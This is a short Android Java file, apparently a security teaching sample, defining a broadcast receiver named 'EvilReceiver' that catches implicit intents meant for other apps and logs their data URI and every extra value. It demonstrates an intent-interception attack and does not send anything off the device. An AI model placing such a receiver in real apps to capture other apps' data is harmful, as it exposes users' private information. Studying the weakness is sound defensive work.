package com.example.implicit.intents.interception;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

public class EvilReceiver extends BroadcastReceiver {

    final static String TAG = "EVIL";

    public void onReceive(Context context, Intent intent) {
        // Get data and extras from the intent
        Uri data = intent.getData();
        Bundle extras = intent.getExtras();

        Log.i(TAG, intent.toString());
        if (data != null)
            Log.i(TAG, "DATA = " + data.toString());
        if (extras != null) {
            String[] keys = extras.keySet().toArray(new String[0]);
            for (String key : keys)
                Log.i(TAG, key + " => " + extras.get(key).toString());
        }
        else
            Log.i(TAG, "No extras in this intent");
    }
}
